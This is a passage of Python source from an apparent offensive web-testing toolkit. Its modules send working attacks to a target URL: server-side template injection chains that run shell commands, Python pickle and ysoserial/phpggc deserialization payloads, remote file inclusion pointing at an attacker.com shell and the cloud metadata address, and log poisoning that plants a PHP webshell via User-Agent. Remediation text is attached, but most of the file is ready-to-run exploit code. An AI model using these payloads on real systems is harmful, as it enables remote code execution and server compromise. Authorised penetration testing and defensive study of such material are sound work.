                    existing_qs[test_param] = payload
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(existing_qs))
                    )
                    resp = requests.get(
                        test_url, headers=headers, timeout=12,
                        verify=verify, allow_redirects=False,
                    )

                    location = resp.headers.get("Location", "")
                    stream("info", f"param={test_param} payload={label}: HTTP {resp.status_code} → {location[:60]}")

                    if resp.status_code in (301, 302, 303, 307, 308) and (
                        "evil.com" in location
                        or attack_url in location
                        or location.startswith("//")
                    ):
                        stream("success", f"Open redirect confirmed: {test_param}={payload}")
                        findings.append({
                            "title": f"Open Redirect — param '{test_param}' ({label})",
                            "severity": "medium",
                            "url": test_url,
                            "description": (
                                f"Parameter '{test_param}' redirects to attacker-controlled domain. "
                                f"Can be exploited for phishing and OAuth token theft."
                            ),
                            "evidence": f"HTTP {resp.status_code} Location: {location}\nPayload: {payload}",
                            "remediation": (
                                "Validate redirect destinations against an allowlist. "
                                "Never build redirect URLs from unsanitized user input."
                            ),
                            "cwe_id": "CWE-601",
                        })
                        break  # Found for this param, move on
                except Exception as e:
                    stream("warning", f"Request failed: {e}")

        stream("info", f"Open redirect scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [SS-08] SSTI → RCE ──────────────────────────────────────────────────────

class SSTIRCEModule(BaseModule):
    id = "SS-08"
    name = "SSTI → RCE"
    category = "server_side"
    description = (
        "Advanced SSTI detection with full RCE payload chains for Jinja2, Twig, "
        "Freemarker, ERB, and Velocity. Goes beyond detection — confirms code execution."
    )
    risk_level = "critical"
    tags = ["ssti", "rce", "jinja2", "twig", "freemarker", "template-injection"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/render?template=Hello+FUZZ",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="GET",
            options=[{"value": "GET", "label": "GET"}, {"value": "POST", "label": "POST"}],
        ),
        FieldSchema(
            key="parameter",
            label="Injectable Parameter",
            field_type="text",
            required=True,
            placeholder="template",
        ),
        FieldSchema(
            key="engines",
            label="Target Template Engines",
            field_type="checkbox_group",
            default=["jinja2", "twig", "freemarker", "erb"],
            options=[
                {"value": "jinja2",     "label": "Jinja2 / Flask (Python)"},
                {"value": "twig",       "label": "Twig (PHP)"},
                {"value": "freemarker", "label": "Freemarker (Java)"},
                {"value": "erb",        "label": "ERB (Ruby)"},
                {"value": "velocity",   "label": "Velocity (Java)"},
                {"value": "pebble",     "label": "Pebble (Java)"},
                {"value": "smarty",     "label": "Smarty (PHP)"},
            ],
        ),
        FieldSchema(
            key="attempt_rce",
            label="Attempt RCE Payloads (after detection)",
            field_type="toggle",
            default=True,
            help_text="If SSTI detected, try full RCE chain (reads /etc/passwd).",
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    # Detection probes: (engine, payload, expected_result)
    _DETECT = {
        "jinja2":     ("{{7*7}}", "49"),
        "twig":       ("{{7*7}}", "49"),
        "freemarker": ("${7*7}", "49"),
        "erb":        ("<%=7*7%>", "49"),
        "velocity":   ("#set($x=7*7)$x", "49"),
        "pebble":     ("{{7*7}}", "49"),
        "smarty":     ("{7*7}", "49"),
    }

    # RCE chains per engine
    _RCE: dict[str, list[str]] = {
        "jinja2": [
            # Via __mro__ subclass chain
            "{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].decode()}}",
            # Shorter if subprocess index differs
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "twig": [
            "{{['id']|map('system')|join}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        ],
        "freemarker": [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        ],
        "erb": [
            "<%= `id` %>",
            "<%= IO.popen('id').read() %>",
        ],
        "velocity": [
            "#set($str=$class.inspect('java.lang.String').type)#set($chr=$class.inspect('java.lang.Integer').type)#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        ],
        "smarty": [
            "{php}echo shell_exec('id');{/php}",
            "{system('id')}",
        ],
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import urllib.parse

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "GET")
        param = params["parameter"]
        engines = params.get("engines", ["jinja2", "twig"])
        attempt_rce = params.get("attempt_rce", True)
        findings = []

        headers = {"User-Agent": "PenTools/SSTI-RCE"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        parsed = urllib.parse.urlparse(url)
        existing_qs = dict(urllib.parse.parse_qsl(parsed.query))

        def send(payload: str) -> requests.Response | None:
            try:
                if method == "GET":
                    qs = {**existing_qs, param: payload}
                    req_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
                    return requests.get(req_url, headers=headers, timeout=15, verify=verify)
                else:
                    return requests.post(url, data={param: payload}, headers=headers, timeout=15, verify=verify)
            except Exception as e:
                stream("warning", f"Request failed: {e}")
                return None

        for engine in engines:
            probe, expected = self._DETECT.get(engine, ("{{7*7}}", "49"))
            stream("info", f"Testing SSTI detection for: {engine} — probe: {probe!r}")
            resp = send(probe)
            if not resp:
                continue

            if expected in resp.text:
                stream("success", f"SSTI DETECTED — {engine.upper()} — probe returned '{expected}'")
                finding = {
                    "title": f"SSTI Detected — {engine.upper()} Engine",
                    "severity": "critical",
                    "url": url,
                    "description": (
                        f"Server-side template injection confirmed on parameter '{param}'. "
                        f"Template engine: {engine}. Probe '{probe}' returned expected result '{expected}'."
                    ),
                    "evidence": f"Probe: {probe}\nExpected: {expected}\nResponse snippet: {resp.text[:400]}",
                    "remediation": (
                        "Never pass user-controlled data to template rendering functions. "
                        "Use a sandboxed template engine. If dynamic templates are needed, "
                        "generate them at design time — not from user input."
                    ),
                    "cwe_id": "CWE-1336",
                }

                # Attempt RCE if enabled
                if attempt_rce and engine in self._RCE:
                    stream("warning", f"Attempting RCE chain for {engine}...")
                    for rce_payload in self._RCE[engine]:
                        rce_resp = send(rce_payload)
                        if rce_resp and ("uid=" in rce_resp.text or "root" in rce_resp.text):
                            stream("success", f"RCE CONFIRMED via {engine.upper()} SSTI!")
                            finding["title"] = f"SSTI → RCE Confirmed — {engine.upper()}"
                            finding["severity"] = "critical"
                            finding["description"] += (
                                f"\n\nRCE CONFIRMED: command 'id' output returned in response. "
                                f"Full server compromise is possible."
                            )
                            finding["evidence"] += f"\n\nRCE evidence: {rce_resp.text[:300]}"
                            break

                findings.append(finding)
            else:
                stream("info", f"No SSTI for {engine} (expected '{expected}' not in response)")

        stream("info", f"SSTI→RCE scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [SS-04] Insecure Deserialization ────────────────────────────────────────

class InsecureDeserializationModule(BaseModule):
    id = "SS-04"
    name = "Insecure Deserialization"
    category = "server_side"
    description = (
        "Generate and deliver deserialization attack payloads for Java (ysoserial), "
        "PHP (phpggc), Python pickle, and .NET (ysoserial.net). Supports DNS/HTTP "
        "out-of-band detection and direct command execution payloads."
    )
    risk_level = "critical"
    tags = ["deserialization", "java", "php", "python", "dotnet", "rce", "ysoserial"]
    celery_queue = "web_audit_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",   label="Target URL",         field_type="url",  required=True,  placeholder="https://example.com/deserialize"),
        FieldSchema(key="method",       label="HTTP Method",        field_type="radio", default="POST",
                    options=[{"value": "POST","label":"POST"}, {"value":"PUT","label":"PUT"}]),
        FieldSchema(
            key="platform",
            label="Deserialization Platform",
            field_type="radio",
            default="java",
            options=[
                {"value": "java",   "label": "Java (ysoserial)"},
                {"value": "php",    "label": "PHP (phpggc)"},
                {"value": "python", "label": "Python pickle"},
                {"value": "dotnet", "label": ".NET (ysoserial.net — Windows)"},
            ],
        ),
        FieldSchema(
            key="java_gadget",
            label="Java Gadget Chain",
            field_type="select",
            default="CommonsCollections1",
            options=[
                {"value": "CommonsCollections1",  "label": "CommonsCollections1"},
                {"value": "CommonsCollections2",  "label": "CommonsCollections2"},
                {"value": "CommonsCollections3",  "label": "CommonsCollections3"},
                {"value": "CommonsCollections4",  "label": "CommonsCollections4"},
                {"value": "CommonsCollections6",  "label": "CommonsCollections6"},
                {"value": "Spring1",              "label": "Spring1"},
                {"value": "Spring2",              "label": "Spring2"},
                {"value": "Groovy1",              "label": "Groovy1"},
                {"value": "JRMPClient",           "label": "JRMPClient (JRMP OOB)"},
            ],
            show_if={"platform": "java"},
        ),
        FieldSchema(
            key="php_gadget",
            label="PHP phpggc Gadget",
            field_type="select",
            default="Laravel/RCE1",
            options=[
                {"value": "Laravel/RCE1",      "label": "Laravel/RCE1"},
                {"value": "Laravel/RCE2",      "label": "Laravel/RCE2"},
                {"value": "Symfony/RCE4",      "label": "Symfony/RCE4"},
                {"value": "Symfony/RCE5",      "label": "Symfony/RCE5"},
                {"value": "Wordpress/RCE1",    "label": "WordPress/RCE1"},
                {"value": "Zend/RCE3",         "label": "Zend/RCE3"},
            ],
            show_if={"platform": "php"},
        ),
        FieldSchema(
            key="command",
            label="Command to Execute",
            field_type="text",
            required=False,
            default="id",
            help_text="Command for RCE payloads. Use 'nslookup OAST_DOMAIN' for OOB detection.",
        ),
        FieldSchema(
            key="oast_domain",
            label="OAST Domain (DNS OOB)",
            field_type="text",
            required=False,
            placeholder="abc.interact.sh",
        ),
        FieldSchema(
            key="delivery",
            label="Delivery Method",
            field_type="radio",
            default="body_raw",
            options=[
                {"value": "body_raw",    "label": "Raw POST body"},
                {"value": "body_b64",    "label": "Base64-encoded POST body"},
                {"value": "header",      "label": "Custom header"},
                {"value": "cookie",      "label": "Cookie value"},
            ],
            group="advanced",
        ),
        FieldSchema(
            key="delivery_name",
            label="Header / Cookie name",
            field_type="text",
            required=False,
            default="X-Serialized-Data",
            group="advanced",
        ),
        FieldSchema(key="auth_header", label="Authorization",  field_type="text", required=False, group="credentials"),
    ]

    def _gen_python_pickle(self, command: str, oast: str) -> bytes:
        """Generate a Python pickle payload that executes a command."""
        import pickle, io, os

        cmd = f"nslookup {oast}" if oast else command
        # Use reduce-based payload (safe for generation, not execution here)
        class Exploit:
            def __reduce__(self):
                return (os.system, (cmd,))

        return pickle.dumps(Exploit())

    def _deliver(self, url: str, method: str, payload: bytes, delivery: str,
                 delivery_name: str, auth: str, stream) -> tuple:
        import urllib.request, urllib.error, base64

        headers = {"User-Agent": "PenTools/1.0"}
        if auth:
            headers["Authorization"] = auth

        data = None
        if delivery == "body_raw":
            data = payload
            headers["Content-Type"] = "application/octet-stream"
        elif delivery == "body_b64":
            data = base64.b64encode(payload)
            headers["Content-Type"] = "text/plain"
        elif delivery == "header":
            headers[delivery_name] = base64.b64encode(payload).decode()
            data = b""
        elif delivery == "cookie":
            headers["Cookie"] = f"{delivery_name}={base64.b64encode(payload).decode()}"
            data = b""

        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                return r.status, r.read(8192).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(2048).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, str(ex)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import base64, time
        from apps.modules.runner import ToolRunner

        url = params["target_url"].strip()
        method = params.get("method", "POST")
        platform = params.get("platform", "java")
        command = params.get("command", "id").strip()
        oast = params.get("oast_domain", "").strip()
        delivery = params.get("delivery", "body_raw")
        delivery_name = params.get("delivery_name", "X-Serialized-Data")
        auth = params.get("auth_header", "").strip()

        findings = []
        raw_lines = [f"Target: {url}", f"Platform: {platform}", f"Delivery: {delivery}"]

        # ── Python pickle (pure Python, no external tool) ──
        if platform == "python":
            stream("info", "Generating Python pickle payload...")
            cmd = f"nslookup {oast}" if oast else command
            try:
                payload = self._gen_python_pickle(cmd, oast)
                stream("info", f"Pickle payload: {len(payload)} bytes")
                code, body = self._deliver(url, method, payload, delivery, delivery_name, auth, stream)
                raw_lines.append(f"Python pickle: HTTP {code}")
                oob_note = f"Check {oast} for DNS/HTTP hits." if oast else ""
                findings.append({
                    "title": f"Python pickle deserialization payload sent",
                    "severity": "critical",
                    "url": url,
                    "description": (
                        f"Pickle payload delivering `{cmd}` was sent to {url}.\n"
                        f"HTTP {code} received. {oob_note}"
                    ),
                    "evidence": f"Payload: {base64.b64encode(payload).decode()[:200]}\nResponse: {body[:500]}",
                    "remediation": (
                        "Never deserialize pickle data from untrusted sources. "
                        "Use JSON or MessagePack for data exchange. "
                        "If pickle is required, cryptographically sign and verify payloads."
                    ),
                    "cvss_score": 9.8, "cwe_id": "CWE-502",
                })
            except Exception as e:
                stream("warning", f"Pickle generation failed: {e}")

        # ── Java ysoserial ──
        elif platform == "java":
            gadget = params.get("java_gadget", "CommonsCollections1")
            cmd = command
            if oast:
                cmd = f"nslookup {oast}"
            stream("info", f"Running ysoserial with gadget {gadget}...")
            runner = ToolRunner("ysoserial")
            result = runner.run(args=[gadget, cmd], stream=stream, timeout=60)
            raw_out = result.get("stdout", "")
            # ysoserial outputs binary via stdout — check if we got data
            if result.get("returncode", 1) == 0 and raw_out:
                try:
                    payload = base64.b64decode(raw_out.strip())
                    code, body = self._deliver(url, method, payload, delivery, delivery_name, auth, stream)
                    raw_lines.append(f"Java ysoserial ({gadget}): HTTP {code}")
                    findings.append({
                        "title": f"Java deserialization payload sent (gadget: {gadget})",
                        "severity": "critical",
                        "url": url,
                        "description": f"ysoserial payload ({gadget}) for `{cmd}` sent. HTTP {code}.",
                        "evidence": f"HTTP {code}\nBody: {body[:500]}",
                        "remediation": "Use Java deserialization filters (JEP 290). Apply allowlisting of expected classes.",
                        "cvss_score": 9.8, "cwe_id": "CWE-502",
                    })
                except Exception as e:
                    stream("warning", f"Could not decode ysoserial output: {e}")
            else:
                if not result.get("stdout"):
                    # ysoserial not installed — document what would be run
                    stream("warning", "ysoserial not found in container — recording payload specification")
                    cmd_str = f"java -jar ysoserial.jar {gadget} '{cmd}' | base64"
                    findings.append({
                        "title": f"Java ysoserial payload spec (gadget: {gadget})",
                        "severity": "info",
                        "url": url,
                        "description": f"ysoserial not installed. To generate manually:\n{cmd_str}",
                        "evidence": cmd_str,
                        "remediation": "Install ysoserial in the tools container for active testing.",
                    })

        # ── PHP phpggc ──
        elif platform == "php":
            gadget = params.get("php_gadget", "Laravel/RCE1")
            stream("info", f"Running phpggc with gadget {gadget}...")
            runner = ToolRunner("phpggc")
            cmd = command if not oast else f"nslookup {oast}"
            result = runner.run(args=[gadget, "system", cmd, "-b"], stream=stream, timeout=60)
            raw_out = result.get("stdout", "").strip()
            if raw_out:
                try:
                    payload = base64.b64decode(raw_out)
                    code, body = self._deliver(url, method, payload, delivery, delivery_name, auth, stream)
                    raw_lines.append(f"PHP phpggc ({gadget}): HTTP {code}")
                    findings.append({
                        "title": f"PHP deserialization payload sent (gadget: {gadget})",
                        "severity": "critical",
                        "url": url,
                        "description": f"phpggc {gadget} payload for `{cmd}` sent. HTTP {code}.",
                        "evidence": f"HTTP {code}\nBody: {body[:500]}",
                        "remediation": "Never pass user-controlled data to unserialize(). Validate serialised class types.",
                        "cvss_score": 9.8, "cwe_id": "CWE-502",
                    })
                except Exception as e:
                    stream("warning", f"phpggc decode error: {e}")
            else:
                cmd_str = f"phpggc {gadget} system '{cmd}' -b"
                findings.append({
                    "title": f"PHP phpggc payload spec (gadget: {gadget})",
                    "severity": "info", "url": url,
                    "description": f"phpggc not installed. To generate:\n{cmd_str}",
                    "evidence": cmd_str,
                    "remediation": "Install phpggc in tools container for active testing.",
                })

        if not findings:
            findings.append({
                "title": "Insecure deserialization — no active result",
                "severity": "info", "url": url,
                "description": "Payload sent but no OOB confirmation or error-based detection available.",
                "evidence": "\n".join(raw_lines),
                "remediation": "Monitor OAST server for out-of-band callbacks. Review server logs.",
            })

        stream("success", f"Deserialization test complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [SS-06] Remote File Inclusion ───────────────────────────────────────────

class RemoteFileInclusionModule(BaseModule):
    id = "SS-06"
    name = "Remote File Inclusion (RFI)"
    category = "server_side"
    description = (
        "Test for Remote File Inclusion vulnerabilities by injecting remote URL "
        "payloads into suspected file-include parameters. Supports PHP RFI, "
        "null byte termination, and OAST-based detection."
    )
    risk_level = "critical"
    tags = ["rfi", "php", "inclusion", "rce", "server_side", "file"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",   label="Target URL",   field_type="url",  required=True, placeholder="https://example.com/page.php?file=home"),
        FieldSchema(key="rfi_param",    label="RFI Parameter",field_type="text", required=True, placeholder="file", default="file"),
        FieldSchema(
            key="rfi_payload_url",
            label="Payload URL (your HTTP server serving PHP)",
            field_type="url",
            required=False,
            placeholder="http://attacker.com/shell.php",
            help_text="Your HTTP server hosting the RFI payload. Leave blank to use OAST probe only.",
        ),
        FieldSchema(
            key="oast_domain",
            label="OAST Domain (OOB detection)",
            field_type="text",
            required=False,
            placeholder="abc.interact.sh",
        ),
        FieldSchema(
            key="techniques",
            label="RFI Techniques",
            field_type="checkbox_group",
            default=["direct", "null_byte", "double_encode"],
            options=[
                {"value": "direct",        "label": "Direct URL (http://...)"},
                {"value": "null_byte",     "label": "Null byte termination (%00)"},
                {"value": "double_encode", "label": "Double URL encoding"},
                {"value": "php_filter",    "label": "php://input wrapper"},
                {"value": "data_uri",      "label": "data:// URI"},
            ],
        ),
        FieldSchema(key="auth_header", label="Authorization", field_type="text", required=False, group="credentials"),
        FieldSchema(key="method",      label="HTTP Method",   field_type="radio", default="GET",
                    options=[{"value":"GET","label":"GET"}, {"value":"POST","label":"POST"}]),
    ]

    def _probe(self, url: str, auth: str) -> tuple:
        import urllib.request, urllib.error
        req = urllib.request.Request(url, headers={
            "User-Agent": "PenTools/1.0",
            **({"Authorization": auth} if auth else {}),
        })
        try:
            with urllib.request.urlopen(req, timeout=12) as r:
                return r.status, r.read(8192).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(2048).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, str(ex)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        from urllib.parse import urlparse, urlunparse, urlencode, parse_qs, quote

        url = params["target_url"].strip()
        param = params.get("rfi_param", "file").strip()
        payload_url = params.get("rfi_payload_url", "").strip()
        oast = params.get("oast_domain", "").strip()
        techniques = params.get("techniques", ["direct"])
        auth = params.get("auth_header", "").strip()
        method = params.get("method", "GET")

        findings = []
        raw_lines = [f"Target: {url}", f"Param: {param}"]
        probes: list[tuple[str, str]] = []  # (tech_name, payload_value)

        base = payload_url or (f"http://{oast}/{job_id[:8]}" if oast else "http://169.254.169.254/")

        if "direct" in techniques:
            probes.append(("direct", base))
        if "null_byte" in techniques:
            probes.append(("null_byte", base + "%00"))
        if "double_encode" in techniques:
            probes.append(("double_encode", quote(base, safe="")))
        if "php_filter" in techniques:
            probes.append(("php://input", "php://input"))
        if "data_uri" in techniques:
            import base64 as b64
            php_code = b64.b64encode(b"<?php phpinfo(); ?>").decode()
            probes.append(("data://", f"data://text/plain;base64,{php_code}"))

        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        for tech, probe_val in probes:
            qs_copy = dict(qs)
            qs_copy[param] = [probe_val]
            new_qs = "&".join(f"{k}={v[0]}" for k, v in qs_copy.items())
            probe_url = urlunparse(parsed._replace(query=new_qs))
            stream("info", f"[{tech}] {probe_url[:100]}...")
            code, body = self._probe(probe_url, auth)
            raw_lines.append(f"[{tech}] HTTP {code}")

            rfi_indicators = [
                "<?php", "phpinfo()", "HTTP_HOST", "PHP Version", "<?=",
                "Warning:", "Fatal error:", "include(",
            ]
            # OAST indicator
            if oast and f"/{job_id[:8]}" in probe_val:
                findings.append({
                    "title": f"RFI payload triggered — OAST probe sent ({tech})",
                    "severity": "critical",
                    "url": probe_url,
                    "description": f"RFI probe using technique '{tech}' was sent. Check {oast} for incoming requests.",
                    "evidence": f"HTTP {code}\n{body[:500]}",
                    "remediation": "Disable allow_url_include in php.ini. Whitelist include paths strictly.",
                    "cvss_score": 9.8, "cwe_id": "CWE-98",
                })
            elif any(ind in body for ind in rfi_indicators):
                stream("success", f"RFI indicator in response for technique {tech}!")
                findings.append({
                    "title": f"Remote File Inclusion detected (technique: {tech})",
                    "severity": "critical",
                    "url": probe_url,
                    "description": f"PHP/include indicator in response body after RFI injection with '{tech}'.",
                    "evidence": body[:1000],
                    "remediation": (
                        "Set allow_url_include=Off in php.ini. "
                        "Use a whitelist of allowed include paths. "
                        "Never pass user input to require/include/include_once."
                    ),
                    "cvss_score": 9.8, "cwe_id": "CWE-98",
                })
                break

        if not findings:
            findings.append({
                "title": f"RFI — no clear indicators in responses",
                "severity": "info", "url": url,
                "description": "No PHP execution indicators detected. Check OAST server for DNS/HTTP hits if used.",
                "evidence": "\n".join(raw_lines[-10:]),
                "remediation": "Verify parameter triggers include. Set allow_url_include=Off as hardening.",
            })

        stream("success", f"RFI test complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [SS-09] Log Poisoning ────────────────────────────────────────────────────

class LogPoisoningModule(BaseModule):
    id = "SS-09"
    name = "Log Poisoning"
    category = "server_side"
    description = (
        "Exploit LFI + writable log files to achieve Remote Code Execution. "
        "Poisons Apache/Nginx access logs or SSH auth logs via crafted User-Agent "
        "or username, then includes the log file via an LFI vulnerability."
    )
    risk_level = "critical"
    tags = ["lfi", "log", "poisoning", "rce", "php", "server_side"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",   label="Target URL (with LFI param)",  field_type="url", required=True,
                    placeholder="https://example.com/page.php?file="),
        FieldSchema(key="lfi_param",    label="LFI Parameter",  field_type="text",  required=True,  default="file"),
        FieldSchema(
            key="log_file",
            label="Log File to Poison",
            field_type="select",
            default="apache_access",
            options=[
                {"value": "apache_access",  "label": "Apache access.log"},
                {"value": "apache_error",   "label": "Apache error.log"},
                {"value": "nginx_access",   "label": "Nginx access.log"},
                {"value": "auth_log",       "label": "/var/log/auth.log (SSH)"},
                {"value": "ftp_log",        "label": "/var/log/vsftpd.log"},
                {"value": "custom",         "label": "Custom path"},
            ],
        ),
        FieldSchema(key="custom_log_path", label="Custom Log Path", field_type="text", required=False,
                    placeholder="/var/log/custom/app.log", show_if={"log_file": "custom"}),
        FieldSchema(
            key="php_payload",
            label="PHP Payload to Inject",
            field_type="text",
            default="<?php system($_GET['cmd']); ?>",
            help_text="This will be injected into the log via User-Agent or username.",
        ),
        FieldSchema(
            key="cmd",
            label="Command to execute after injection",
            field_type="text",
            default="id",
        ),
        FieldSchema(key="auth_header", label="Authorization",  field_type="text", required=False, group="credentials"),
    ]

    LOG_PATHS = {
        "apache_access": ["/var/log/apache2/access.log", "/var/log/httpd/access_log", "/var/log/apache/access.log"],
        "apache_error":  ["/var/log/apache2/error.log",  "/var/log/httpd/error_log"],
        "nginx_access":  ["/var/log/nginx/access.log"],
        "auth_log":      ["/var/log/auth.log", "/var/log/secure"],
        "ftp_log":       ["/var/log/vsftpd.log", "/var/log/proftpd/proftpd.log"],
    }

    def _req(self, url: str, extra_headers: dict) -> tuple:
        import urllib.request, urllib.error
        req = urllib.request.Request(url, headers={"User-Agent": "PenTools/1.0", **extra_headers})
        try:
            with urllib.request.urlopen(req, timeout=12) as r:
                return r.status, r.read(8192).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(2048).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, str(ex)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        from urllib.parse import urlparse, urlunparse, parse_qs, quote

        url = params["target_url"].strip()
        lfi_param = params.get("lfi_param", "file").strip()
        log_type = params.get("log_file", "apache_access")
        custom_path = params.get("custom_log_path", "").strip()
        php_payload = params.get("php_payload", "<?php system($_GET['cmd']); ?>").strip()
        cmd = params.get("cmd", "id").strip()
        auth = params.get("auth_header", "").strip()

        findings = []
        raw_lines = [f"Target: {url}", f"LFI param: {lfi_param}", f"Log type: {log_type}"]

        if log_type == "custom" and custom_path:
            log_paths = [custom_path]
        else:
            log_paths = self.LOG_PATHS.get(log_type, ["/var/log/apache2/access.log"])

        extra_hdrs = {}
        if auth:
            extra_hdrs["Authorization"] = auth

        # Step 1: Poison the log via User-Agent
        stream("info", f"Step 1: Poisoning log via User-Agent: {php_payload}")
        poison_hdrs = {**extra_hdrs, "User-Agent": php_payload}
        poison_req = urllib.request.Request(url, headers=poison_hdrs) if True else None
        try:
            import urllib.request
            with urllib.request.urlopen(
                urllib.request.Request(url, headers=poison_hdrs), timeout=10
            ) as r:
                p_code = r.status
                p_body = r.read(1024).decode("utf-8", errors="replace")
        except Exception as e:
            p_code, p_body = 0, str(e)
        raw_lines.append(f"Poison request: HTTP {p_code}")
        stream("info", f"Poison request sent (HTTP {p_code})")

        # Step 2: Include the log file via LFI
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        for log_path in log_paths:
            stream("info", f"Step 2: Including log file: {log_path}")
            qs_copy = dict(qs)
            qs_copy[lfi_param] = [log_path]
            new_qs = "&".join(f"{k}={v[0]}" for k, v in qs_copy.items())

            # Also add cmd parameter for the webshell
            if "cmd" not in new_qs:
                new_qs += f"&cmd={quote(cmd)}"

            include_url = urlunparse(parsed._replace(query=new_qs))
            code, body = self._req(include_url, extra_hdrs)
            raw_lines.append(f"LFI include ({log_path}): HTTP {code}")

            rce_indicators = [
                "uid=", "root:", "www-data", "apache", "nginx",
                "/bin/sh", "/usr/bin", "Linux ", "Darwin ",
            ]
            log_indicators = ["GET /", "POST /", "HTTP/1.", "Mozilla/5.0"]

            if any(ind in body for ind in rce_indicators):
                stream("success", f"RCE via log poisoning confirmed! Log: {log_path}")
                findings.append({
                    "title": f"Log poisoning RCE via {log_path}",
                    "severity": "critical",
                    "url": include_url,
                    "description": (
                        f"PHP payload injected into {log_path} via User-Agent was executed via LFI.\n"
                        f"Command '{cmd}' output visible in response."
                    ),
                    "evidence": body[:2000],
                    "remediation": (
                        "Disable PHP execution in log directories. "
                        "Disable allow_url_fopen and allow_url_include. "
                        "Use basename() for include paths. "
                        "Set open_basedir restriction in PHP config."
                    ),
                    "cvss_score": 10.0, "cwe_id": "CWE-94",
                })
                break
            elif any(ind in body for ind in log_indicators):
                stream("info", f"Log file readable via LFI ({log_path}) — payload may need time to appear")
                findings.append({
                    "title": f"LFI can read log file ({log_path})",
                    "severity": "high",
                    "url": include_url,
                    "description": (
                        f"LFI successfully reads {log_path}. "
                        "PHP payload was injected into User-Agent. "
                        "If allow_url_include is on, RCE may be achievable."
                    ),
                    "evidence": body[:1000],
                    "remediation": "Restrict include paths. Disable PHP log poisoning via open_basedir.",
                    "cvss_score": 8.5, "cwe_id": "CWE-22",
                })
            else:
                stream("info", f"Log file {log_path}: not readable or PHP not executing")

        if not findings:
            findings.append({
                "title": "Log poisoning — no RCE confirmed",
                "severity": "info", "url": url,
                "description": "Poison sent and LFI attempted, but no RCE indicator in response.",
                "evidence": "\n".join(raw_lines[-10:]),
                "remediation": "Disable allow_url_include. Restrict log file paths from LFI.",
            })

        stream("success", f"Log poisoning test complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}
